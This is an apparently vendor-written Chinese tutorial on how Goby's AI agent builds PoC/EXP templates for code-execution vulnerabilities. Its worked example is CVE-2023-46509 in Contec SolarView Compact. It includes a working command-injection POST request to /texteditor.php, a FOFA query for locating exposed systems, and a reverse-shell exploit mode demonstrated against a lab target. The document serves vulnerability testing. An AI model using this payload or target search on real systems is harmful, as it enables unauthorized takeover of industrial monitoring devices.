# Goby AI 智能生成代码执行类型漏洞的PoC/EXP步骤及其构成方式

以“Contec SolarView Compact /texteditor.php 代码执行漏洞（CVE-2023-46509）
”为例，我们可以先查看此漏洞细节的参考来源链接：
https://github.com/ATonysan/poc-exp/blob/main/CVE-2023-46509RCE_test.py （对于此类不详细文章我们可以提取出关键信息以文本转换，如下）
```
漏洞名称：
Contec SolarView Compact /texteditor.php 代码执行漏洞（CVE-2023-46509）

漏洞描述	：
Contec SolarView Compact 是日本 Contec 公司开发的一款光伏发电测量系统。该漏洞存在于 /texteditor.php 接口中，攻击者可以通过构造恶意请求利用命令注入漏洞，执行任意命令，从而完全控制受影响的系统。

漏洞危害	：
该漏洞允许攻击者在受影响的系统上执行任意命令，可能导致系统被完全控制，敏感数据泄露以及业务中断等严重后果。

解决方案	：
建议立即升级到最新版本的 SolarView Compact，并对 /texteditor.php 接口进行严格的输入验证，防止命令注入。同时，限制对该接口的访问权限，确保只有授权用户可以访问。

FOFA语法：
body="SolarView Compact" && title="Top"

POC参考：
POST /texteditor.php?save=save&w_delimit=crlf HTTP/1.1
Host: {{file:line(D:\network_security\Yakit\Yakit\yakit-projects\temp\tmp3361124664.txt)}}
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36

directory=%2Fhome%2Fcontec%2Fdata%2FoutputCtrl%2Fremote%2F2016%2F&w_charset=euc&newfile=&editfile=%2ftmp%2f6&contents=456&writable=1&chmod=on&perm=777%20/tmp|echo DASDewrfdsf||
```


在JSON图形化页面中,Goby PoC自定义编写模板分为三个模块，分别为：漏洞信息、扫描测试（PoC）、利用测试(EXP)，AI需要针对这三个模块进行智能填充


首先，当接收到漏洞详情文章链接或文本时，智能体首先解析文章中的文本和图片内容，提取漏洞背景描述、漏洞类型、资产语法、请求包和响应包等关键信息。

## 提取漏洞基础信息：
将以上得到的漏洞细节文本输入给AI转换poc，智能体提取到这部分信息进行自动填写，同时自动翻译英文版自动填充：
**![](https://s3.bmp.ovh/imgs/2025/02/19/5011352bd5cc65b0.png)**

**![](https://s3.bmp.ovh/imgs/2025/02/19/3161f02d6425112d.png)**


## 提取扫描测试请求包及响应包验证条件：

智能体从文本中扫描提取到该漏洞为代码执行，定义一个全局变量“COMMAND”，query_encode表示将值进行url编码；（COMMAND是json图形化编写poc中的代码执行模块中的一个内置变量，这个内置变量参与响应测试与exp执行，该变量的值就是我们注入的命令。）


**![](https://s3.bmp.ovh/imgs/2025/02/19/1a179a4d97e2e82f.png)**


### 扫描测试请求包：
智能体提取文章中的请求包信息，并填入框内
**![](https://s3.bmp.ovh/imgs/2025/02/19/44ba844796d86fba.png)**

此处{{{COMMAND}}}的位置就是命令的注入位置

### 响应包验证机制：
与其他通过响应包特则来检测的漏洞逻辑不同，代码执行类型的检测逻辑是：
发送数据包→检测返回包中是否存在某特征来确定是否存在漏洞。
> 在响应测试中，利用了这个全局变量COMMAND后，goby内置函数会直接构造“echo 随机字符串”，赋值给COMMAND，发送请求包后，测试网站执行这条命令输出的这一串随机字符串，最后在响应测试中goby内置函数会自行匹配返回包的body中是否存在这串随机字符，从而达到检测是否漏洞存在的效果。在exp执行结果输出时也与响应测试大差不差，利用了COMMAND这个内置变量后，goby的内置函数会自行将我们输入的命令用两个“echo 随机字符串”包裹起来，前后随机字符串一样，例如“echo B8C6 && id && echo B8C6”，返回的内容就会是“B8C6 返回结果 B8C6”，然后goby的内置函数就会通过这个随机字符串”B8C6”正则匹配返回包的body中的这串随机字符来输出执行结果。
**![](https://s3.bmp.ovh/imgs/2025/02/19/6fecc590b35f6c98.png)**
> 
在Goby内置的代码执行漏洞模板中，通过Goby的内置参数及模板自动实现上述检测流程，所以在AI转化的响应包验证条件中仅填入 “code=200”即可。
**![](https://s3.bmp.ovh/imgs/2025/02/19/f2977c5db14f3bd0.png)**


## 定义利用测试输入方式及输出结果：

### 输入：
智能体识别出该文本是代码执行类型时，就会选择相对应的exp参数自动填写：
**![](https://s3.bmp.ovh/imgs/2025/02/19/8ccb31ed2b005cdc.png)**


其中exp有Command，Reverse两种模式：
command指命令执行
Reverse指反弹shell。

### 输出：
通过Goby内置模板自动实现利用测试，所以代码执行类型漏洞无需再进行利用测试模块的编写。（在后续发布的正式版中，会将此模板开放编写，当前内测版暂不开放）
**![](https://s3.bmp.ovh/imgs/2025/02/19/ae6dba1628f0c528.png)**


# 实战检验: Contec SolarView Compact /texteditor.php 代码执行漏洞

输入靶场目标进行扫描，确认扫描测试准确性：√

**![](https://s3.bmp.ovh/imgs/2025/02/19/333dfcd660a68a6e.png)**

点击验证，检测输出信息的准确性：√
**![](https://s3.bmp.ovh/imgs/2025/02/19/e0064b31f85c1472.png)**

一键连接，获取shell:√
**![](https://s3.bmp.ovh/imgs/2025/02/19/038750719c7ca0ef.png)**
**![](https://s3.bmp.ovh/imgs/2025/02/19/2d1a935997ede3dd.png)**

## GobyAI 智能生成代码执行类型漏洞完整流程演示效果如下：

**![](https://s3.bmp.ovh/imgs/2025/02/19/63eb2a2248b08dad.gif)**
